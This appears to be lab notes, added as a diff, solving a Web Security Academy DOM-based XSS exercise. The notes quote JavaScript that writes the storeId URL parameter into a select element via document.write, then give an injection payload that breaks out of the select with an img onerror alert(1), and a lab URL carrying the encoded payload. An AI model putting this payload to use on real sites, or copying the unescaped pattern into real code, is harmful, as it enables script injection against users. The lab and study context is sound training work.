@@ -1,0 +1,26 @@
+
+code in DOM
+
+	var stores = ["London","Paris","Milan"];
+	var store = (new URLSearchParams(window.location.search)).get('storeId');
+	document.write('<select name="storeId">');
+	if(store) {
+		document.write('<option selected>'+store+'</option>');
+	}
+	for(var i=0;i<stores.length;i++) {
+		if(stores[i] === store) {
+			continue;
+		}
+		document.write('<option>'+stores[i]+'</option>');
+	}
+	document.write('</select>');
+
+
+
+
+<select name=storeId>
+<option selected>Paris2</select><img src=1 onerror=alert(1)></option>
+
+"></select><img src=1 onerror=alert(1)>
+
+https://0a9700d4035d477b81d1f2f9005c002c.web-security-academy.net/product?productId=1&storeId=%22%3E%3C/select%3E%3Cimg%20src=1%20onerror=alert(1)%3E
